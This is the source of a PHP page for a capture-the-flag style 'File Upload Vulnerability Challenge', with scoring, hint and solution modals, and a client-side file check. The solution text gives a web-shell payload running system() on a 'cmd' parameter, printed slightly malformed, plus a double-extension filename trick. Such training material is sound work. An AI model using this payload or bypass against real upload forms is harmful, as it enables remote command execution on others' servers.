<?php
// fileupload.php (top of file)
require 'config.php';
session_start();

if (!isset($_SESSION['user_id'])) {
    header("Location: index.php");
    exit();
}
$userId = $_SESSION['user_id'];

// 1) JSON‐AJAX for hint/solution
if ($_SERVER['REQUEST_METHOD'] === 'POST'
    && stripos($_SERVER['CONTENT_TYPE'] ?? '', 'application/json') !== false
) {
    $data = json_decode(file_get_contents('php://input'), true);
    if (!empty($data['type']) && in_array($data['type'], ['hint','solution'], true)) {
        $col = "fileupload_{$data['type']}seen";  // fileupload_hintseen or _solutionseen
        $stmt = $pdo->prepare("UPDATE user_task_progress SET {$col} = 1 WHERE user_id = ?");
        $stmt->execute([$userId]);
        echo json_encode(['success' => true]);
        exit;
    }
}

// 2) Form‐POST for “complete” → calculate & save score
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['complete'])) {
    // fetch existing progress
    $stmt = $pdo->prepare("SELECT * FROM user_task_progress WHERE user_id = ?");
    $stmt->execute([$userId]);
    $progress = $stmt->fetch(PDO::FETCH_ASSOC) ?: [];

    $baseScore = 50;
    $deduction = 0;
    if (!empty($progress['fileupload_solutionseen'])) $deduction += 80;
    if (!empty($progress['fileupload_hintseen']))     $deduction += 30;

    $marks = max($baseScore - ($baseScore * $deduction / 100), 0);
    $marks = (int)round($marks);

    $upd = $pdo->prepare("
      UPDATE user_task_progress
         SET fileupload_complete   = 1,
             fileupload_totalmark = ?
       WHERE user_id = ?
    ");
    $ok = $upd->execute([$marks, $userId]);

    header('Content-Type: application/json');
    if ($ok) {
        echo json_encode([
          'success' => true,
          'message' => "Challenge completed! Score: {$marks}/{$baseScore}"
        ]);
    } else {
        echo json_encode(['error' => 'Failed to save score.']);
    }
    exit;
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>File Upload Vulnerability Challenge</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
  <style>
    :root {
      --primary: #4361ee;
      --secondary: #3f37c9;
      --accent: #4895ef;
      --dark: #2b2d42;
      --light: #f8f9fa;
      --success: #4cc9f0;
      --warning: #f8961e;
      --danger: #f72585;
      --gray: #6c757d;
      --dark-bg: #0f172a;
      --card-bg: #1e293b;
    }

    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: 'Poppins', sans-serif;
    }

    body {
      background: linear-gradient(135deg, var(--dark-bg), #1a2a42);
      color: var(--light);
      display: flex;
      flex-direction: column;
      align-items: center;
      min-height: 100vh;
      padding: 30px 15px;
    }

    .intro {
      text-align: center;
      max-width: 800px;
      margin-bottom: 40px;
      animation: fadeInDown 0.8s ease;
    }

    .intro h1 {
      font-size: 3rem;
      font-weight: 700;
      background: linear-gradient(90deg, var(--danger), var(--warning));
      -webkit-background-clip: text;
      color: transparent;
      margin-bottom: 20px;
    }

    .intro p {
      font-size: 1.1rem;
      color: rgba(255, 255, 255, 0.75);
      line-height: 1.6;
    }

    .playground {
      background: var(--card-bg);
      padding: 2.5rem;
      border-radius: 16px;
      box-shadow: 0 15px 30px rgba(0, 0, 0, 0.3);
      width: 100%;
      max-width: 800px;
      margin-bottom: 30px;
      animation: fadeInUp 0.8s ease;
    }

    .playground h2 {
      text-align: center;
      margin-bottom: 20px;
      font-size: 1.8rem;
    }

    .upload-area {
      border: 2px dashed var(--accent);
      border-radius: 10px;
      padding: 2rem;
      text-align: center;
      margin-bottom: 1.5rem;
      position: relative;
      transition: all 0.3s ease;
    }

    .upload-area.highlight {
      border-color: var(--success);
      background-color: rgba(76, 201, 240, 0.1);
    }

    .upload-area i {
      font-size: 3rem;
      color: var(--accent);
      margin-bottom: 1rem;
    }

    .upload-area input[type="file"] {
      position: absolute;
      width: 100%;
      height: 100%;
      top: 0;
      left: 0;
      opacity: 0;
      cursor: pointer;
    }

    button {
      width: 100%;
      padding: 1rem;
      border: none;
      border-radius: 10px;
      background: linear-gradient(135deg, var(--danger), var(--warning));
      color: white;
      font-weight: 600;
      font-size: 1rem;
      cursor: pointer;
      margin-top: 10px;
      transition: all 0.3s ease;
    }

    button:hover {
      transform: translateY(-2px);
      box-shadow: 0 5px 15px rgba(247, 37, 133, 0.3);
    }

    .actions {
      display: flex;
      gap: 20px;
      margin-top: 20px;
      justify-content: center;
    }

    .action-btn {
      padding: 0.7rem 1.2rem;
      background: #334155;
      border-radius: 10px;
      cursor: pointer;
      transition: all 0.3s ease;
      font-weight: 500;
      border: 1px solid var(--danger);
    }

    .action-btn:hover {
      background: var(--danger);
      color: white;
    }

    .result-container {
      margin-top: 30px;
      padding: 20px;
      background: #334155;
      border-radius: 10px;
      border: 1px solid var(--danger);
    }

    .result-container h3 {
      margin-bottom: 15px;
      color: var(--danger);
    }

    #uploadResult {
      min-height: 100px;
      padding: 15px;
      background: #1e293b;
      border-radius: 8px;
      font-family: monospace;
      white-space: pre-wrap;
    }

    .file-info {
      margin-top: 15px;
      padding: 10px;
      background: #2b3a4f;
      border-radius: 5px;
    }

    .navigation {
      display: flex;
      justify-content: space-between;
      width: 100%;
      max-width: 800px;
      margin-top: 20px;
    }

    .nav-btn {
      padding: 0.8rem 1.5rem;
      background: #334155;
      border-radius: 10px;
      cursor: pointer;
      transition: all 0.3s ease;
      font-weight: 500;
      border: 1px solid var(--accent);
      color: white;
      display: flex;
      align-items: center;
      gap: 8px;
    }

    .nav-btn:hover {
      background: var(--accent);
    }

    /* Modal */
    .modal {
      display: none;
      position: fixed;
      z-index: 10;
      left: 0;
      top: 0;
      width: 100%;
      height: 100%;
      background: rgba(0,0,0,0.6);
      justify-content: center;
      align-items: center;
    }

    .modal-content {
      background: var(--card-bg);
      padding: 2rem;
      border-radius: 12px;
      width: 90%;
      max-width: 500px;
      text-align: center;
      position: relative;
    }

    .close {
      position: absolute;
      top: 15px;
      right: 20px;
      font-size: 1.5rem;
      cursor: pointer;
      color: var(--gray);
    }

    @keyframes fadeInUp {
      from { opacity: 0; transform: translateY(20px); }
      to { opacity: 1; transform: translateY(0); }
    }

    @keyframes fadeInDown {
      from { opacity: 0; transform: translateY(-20px); }
      to { opacity: 1; transform: translateY(0); }
    }

    code {
      background: #2b3a4f;
      padding: 2px 5px;
      border-radius: 3px;
      font-family: monospace;
    }

    .code-block {
      display: block;
      background: #2b3a4f;
      padding: 10px;
      border-radius: 5px;
      margin: 10px 0;
      text-align: left;
      overflow-x: auto;
    }
  </style>
</head>
<body>

  <div class="intro">
    <h1>File Upload Vulnerability Challenge</h1>
    <p>Test your skills against a vulnerable file upload system. Your goal is to upload a file that contains executable code that the server will run. The system checks both file extensions and content patterns.</p>
  </div>
  
  <div class="playground">
    <h2>Profile Picture Upload</h2>
    <form id="uploadForm">
      <div class="upload-area" id="uploadArea">
        <i class="fas fa-cloud-upload-alt"></i>
        <h3>Drag & Drop your file here</h3>
        <p>or click to browse (only images allowed)</p>
        <input type="file" id="fileInput" accept=".jpg,.png,.jpeg" />
      </div>
      <button type="submit">Upload File</button>
    </form>

    <div class="result-container">
      <h3>Upload Analysis:</h3>
      <div id="uploadResult">
        File details and analysis results will appear here...
      </div>
    </div>

    <div class="actions">
      <div class="action-btn" id="hintBtn">Hint</div>
      <div class="action-btn" id="solutionBtn">Solution</div>
    </div>
  </div>

  <div class="navigation">
    <a class="nav-btn" href="dashboard.php">
      <i class="fas fa-home"></i> Dashboard
    </a>
    <a class="nav-btn" href="logout.php">
      <i class="fas fa-sign-out-alt"></i> Logout
    </a>
  </div>

  <!-- Modal -->
  <div class="modal" id="modal">
    <div class="modal-content">
      <span class="close" id="closeModal">&times;</span>
      <h3 id="modalTitle"></h3>
      <p id="modalText"></p>
    </div>
  </div>

  <!-- ... your existing HTML up through the <script> tag ... -->
<script>
document.addEventListener('DOMContentLoaded', () => {
  // Element refs
  const uploadForm   = document.getElementById('uploadForm');
  const uploadArea   = document.getElementById('uploadArea');
  const fileInput    = document.getElementById('fileInput');
  const selectedInfo = document.getElementById('selectedFileInfo');
  const uploadResult = document.getElementById('uploadResult');
  const hintBtn      = document.getElementById('hintBtn');
  const solutionBtn  = document.getElementById('solutionBtn');
  const modal        = document.getElementById('modal');
  const modalTitle   = document.getElementById('modalTitle');
  const modalText    = document.getElementById('modalText');
  const closeModal   = document.getElementById('closeModal');

  // --- Modal Helpers ---
  function showModal(title, html) {
    modalTitle.textContent = title;
    modalText.innerHTML   = html;
    modal.style.display    = 'flex';
  }
  closeModal.onclick = () => modal.style.display = 'none';
  window.addEventListener('click', e => {
    if (e.target === modal) modal.style.display = 'none';
  });

  // --- Hint/Solution Tracking ---
  async function record(type) {
    await fetch(window.location.href, {
      method: 'POST',
      credentials: 'same-origin',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ type })
    });
  }
  hintBtn.onclick = async () => {
    await record('hint');
    showModal('Hint 🧩',
      'Try uploading a file with embedded PHP:<br>' +
      '<code>avatar.jpg.php</code> or EXIF payload <code>&lt;?php…?&gt;</code>.'
    );
  };
  solutionBtn.onclick = async () => {
    await record('solution');
    showModal('Solution 💡',
      'Use a “double extension” trick:<br>' +
      '<code>GIF89a;<php system($_GET[\'cmd\']);?></code><br>' +
      'Filename: <code>exploit.png.php</code>'
    );
  };

  // --- File selection display ---
  fileInput.addEventListener('change', () => {
    const f = fileInput.files[0];
    selectedInfo.textContent = f ? `Selected file: ${f.name}` : '';
    uploadResult.innerHTML = '';
  });

  // --- Drag & Drop wiring ---
  ['dragenter','dragover','dragleave','drop'].forEach(evt => {
    uploadArea.addEventListener(evt, e => {
      e.preventDefault(); e.stopPropagation();
    });
  });
  ['dragenter','dragover'].forEach(evt =>
    uploadArea.addEventListener(evt, () => uploadArea.classList.add('highlight'))
  );
  ['dragleave','drop'].forEach(evt =>
    uploadArea.addEventListener(evt, () => uploadArea.classList.remove('highlight'))
  );
  uploadArea.addEventListener('drop', e => {
    const file = e.dataTransfer.files[0];
    if (!file) return;
    const dt = new DataTransfer();
    dt.items.add(file);
    fileInput.files = dt.files;
    selectedInfo.textContent = `Selected file: ${file.name}`;
  });

  // --- File analysis & result display ---
  function analyzeFile(file) {
    const reader = new FileReader();
    reader.onload = () => {
      const txt   = reader.result;
      const name  = file.name.toLowerCase();
      const ext   = name.slice(name.lastIndexOf('.'));
      let analysis = { isMalicious: false, reason: '' };

      const hasPHP = /<\?php[\s\S]*?\?>/i.test(txt) ||
                     /<\?=[\s\S]*?\?>/i.test(txt);
      const hasJS  = /<script\b[^>]*>[\s\S]*?<\/script>/i.test(txt);
      const badExt = ['.php','.phtml','.phar','.html','.htm','.js']
                       .includes(ext);

      if (hasPHP) {
        analysis = { isMalicious: true, reason: 'PHP code detected' };
      } else if (hasJS && ['.html','.htm','.js'].includes(ext)) {
        analysis = { isMalicious: true, reason: 'JavaScript detected' };
      } else if (badExt) {
        analysis = { isMalicious: true, reason: 'Dangerous extension' };
      }

      showResult(file, analysis);
    };
    reader.readAsText(file);
  }

  function showResult(file, analysis) {
    uploadResult.innerHTML = `
      <div class="file-info">
        <strong>Filename:</strong> ${file.name}<br>
        <strong>Type:</strong> ${file.type || 'unknown'}
      </div>
      <div style="color:${analysis.isMalicious ? '#f72585' : '#4cc9f0'}">
        ${analysis.isMalicious
          ? '⚠️ ' + analysis.reason
          : '✓ File appears safe'
        }
      </div>
    `;
    if (analysis.isMalicious) {
      // auto‐claim score
      fetch(window.location.href, {
        method: 'POST',
        credentials: 'same-origin',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'complete=1'
      })
      .then(r => r.json())
      .then(data => {
        showModal(
          data.success ? 'Success 🎯' : 'Error!',
          data.success ? data.message
                       : (data.error || 'Failed to save score')
        );
      });
    }
  }

  // --- Form submit override ---
  uploadForm.addEventListener('submit', e => {
    e.preventDefault();
    const f = fileInput.files[0];
    if (!f) {
      showModal('Error', 'Please select or drop a file first.');
      return;
    }
    analyzeFile(f);
  });
});
</script>



</body>
</html>